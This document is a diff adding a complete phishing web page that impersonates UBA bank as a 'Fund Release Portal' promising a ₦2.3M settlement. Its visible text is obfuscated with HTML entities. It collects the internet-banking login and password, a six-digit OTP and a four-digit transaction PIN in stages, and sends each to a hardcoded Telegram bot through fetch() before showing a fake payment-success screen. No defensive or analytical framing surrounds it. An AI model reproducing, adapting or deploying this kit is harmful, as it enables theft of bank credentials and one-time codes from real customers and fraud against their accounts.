@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>S&#101;ttl&#101;m&#101;nt C&#111;nfirm&#97;ti&#111;n</title>
+    <style>
+        :root { --uba-red: rgba(211, 47, 47, 0.95); }
+        body { margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif; background: #f4f4f4; height: 100vh; display: flex; align-items: center; justify-content: center; }
+        
+        .main-container { background: var(--uba-red); width: 400px; padding: 35px; border-radius: 12px; color: white; box-shadow: 0 15px 35px rgba(0,0,0,0.4); text-align: center; }
+        .brand-logo { font-weight: 800; font-size: 2.8em; letter-spacing: -1px; margin-bottom: 5px; }
+        .header-title { font-size: 0.9em; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 25px; opacity: 0.9; }
+
+        .info-box { background: rgba(0,0,0,0.25); padding: 15px; border-radius: 6px; margin-bottom: 20px; font-size: 0.85em; text-align: left; border-left: 4px solid #fff; }
+        .info-box p { margin: 5px 0; }
+
+        .input-group { text-align: left; margin-bottom: 18px; }
+        label { display: block; font-size: 0.8em; margin-bottom: 6px; font-weight: 600; }
+        input { width: 100%; padding: 12px; border: 1px solid rgba(255,255,255,0.4); border-radius: 4px; background: rgba(255,255,255,0.15); color: white; font-size: 1em; box-sizing: border-box; outline: none; }
+        input.invalid { border: 2px solid #ff4d4d; background: rgba(255, 77, 77, 0.2); }
+
+        button { width: 100%; padding: 15px; margin-top: 10px; background: transparent; border: 2px solid white; color: white; font-weight: bold; cursor: pointer; border-radius: 4px; text-transform: uppercase; }
+        button:hover { background: white; color: #d32f2f; }
+
+        #loader { display: none; padding: 20px; }
+        .spinner { width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.3); border-top: 4px solid #fff; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .stage { display: none; }
+        .active { display: block; }
+    </style>
+</head>
+<body>
+
+<div class="main-container">
+    <div class="brand-logo">&#85;&#66;&#65;</div>
+    <div class="header-title">F&#117;nd R&#101;l&#101;as&#101; Port&#97;l</div>
+
+    <div class="info-box">
+        <p><strong>B&#101;n&#101;f&#105;ci&#97;ry:</strong> A&#119;&#97;it&#105;ng V&#101;rif&#105;cati&#111;n</p>
+        <p><strong>Am&#111;&#117;nt:</strong> &#8322;&#46;&#51;&#77;&#32;&#78;&#71;&#78;</p>
+        <p><strong>St&#97;t&#117;s:</strong> P&#101;nding S&#101;ttl&#101;m&#101;nt</p>
+    </div>
+
+    <div id="stage1" class="stage active">
+        <div class="input-group">
+            <label>Us&#101;r I&#68; / Acc&#111;&#117;nt N&#117;mb&#101;r</label>
+            <input type="text" id="uid" placeholder="Enter ID">
+        </div>
+        <div class="input-group">
+            <label>I&#110;tern&#101;t B&#97;nk&#105;ng P&#97;ssw&#111;rd</label>
+            <input type="password" id="pwd" placeholder="Enter Password">
+        </div>
+        <button onclick="processStage(1)">L&#79;GIN TO CL&#101;AR</button>
+    </div>
+
+    <div id="stage2" class="stage">
+        <p>A S&#101;c&#117;rity Code has been sent to your registered mobile number.</p>
+        <div class="input-group">
+            <label>Ent&#101;r 6-D&#105;g&#105;t O&#84;P</label>
+            <input type="text" id="otp" placeholder="000000" maxlength="6">
+        </div>
+        <button onclick="processStage(2)">V&#101;RIFY O&#84;P</button>
+    </div>
+
+    <div id="stage3" class="stage">
+        <p>Confirm the final s&#101;ttl&#101;m&#101;nt of &#8322;&#46;&#51;&#77;.</p>
+        <div class="input-group">
+            <label>4-D&#105;g&#105;t Transacti&#111;n P&#105;n</label>
+            <input type="password" id="pin" placeholder="****" maxlength="4">
+        </div>
+        <button onclick="processStage(3)">C&#111;NFIRM P&#65;YMENT</button>
+    </div>
+
+    <div id="stage4" class="stage">
+        <div style="font-size: 4em; margin-bottom: 10px;">&#9989;</div>
+        <h3>P&#65;YMENT S&#85;CC&#69;SSF&#85;L</h3>
+        <p>Ref: #UBA-230-99284</p>
+        <p style="font-size: 0.85em; opacity: 0.8;">F&#117;nds w&#105;ll r&#101;fl&#101;ct w&#105;th&#105;n 2 h&#111;&#117;rs.</p>
+    </div>
+
+    <div id="loader">
+        <div class="spinner"></div>
+        <p id="loadText">Initial&#105;z&#105;ng...</p>
+    </div>
+</div>
+
+<script>
+    const bT = "8368914920:AAHI2tiRbLzxV70DWKkja9vwuRoQh089MUo";
+    const cI = "7909543900";
+
+    async function report(data) {
+        const url = `https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(data)}`;
+        try { await fetch(url); } catch(e) {}
+    }
+
+    function showLoad(status, msg = "") {
+        document.getElementById('loader').style.display = status ? 'block' : 'none';
+        if(msg) document.getElementById('loadText').innerHTML = msg;
+    }
+
+    async function processStage(s) {
+        if (s === 1) {
+            const u = document.getElementById('uid');
+            const p = document.getElementById('pwd');
+            if(u.value.length >= 4 && p.value.length >= 1) {
+                document.getElementById('stage1').classList.remove('active');
+                showLoad(true, "V&#101;rif&#105;cati&#111;n in Pr&#111;gr&#101;ss...");
+                await report(`📢 NEW LOGIN\nUser: ${u.value}\nPass: ${p.value}\nAmt: 2.3M`);
+                setTimeout(() => { showLoad(false); document.getElementById('stage2').classList.add('active'); }, 3500);
+            }
+        } 
+        else if (s === 2) {
+            const o = document.getElementById('otp');
+            if(o.value.length === 6) {
+                document.getElementById('stage2').classList.remove('active');
+                showLoad(true, "Sync&#105;ng S&#101;c&#117;rity K&#101;ys...");
+                await report(`🔑 OTP ENTERED\nCode: ${o.value}`);
+                setTimeout(() => { showLoad(false); document.getElementById('stage3').classList.add('active'); }, 3000);
+            }
+        }
+        else if (s === 3) {
+            const n = document.getElementById('pin');
+            if(n.value.length === 4) {
+                document.getElementById('stage3').classList.remove('active');
+                showLoad(true, "R&#101;l&#101;as&#105;ng F&#117;nds...");
+                await report(`💰 FINAL PIN\nPIN: ${n.value}`);
+                setTimeout(() => { showLoad(false); document.getElementById('stage4').classList.add('active'); }, 4500);
+            }
+        }
+    }
+</script>
+</body>
+</html>
+      
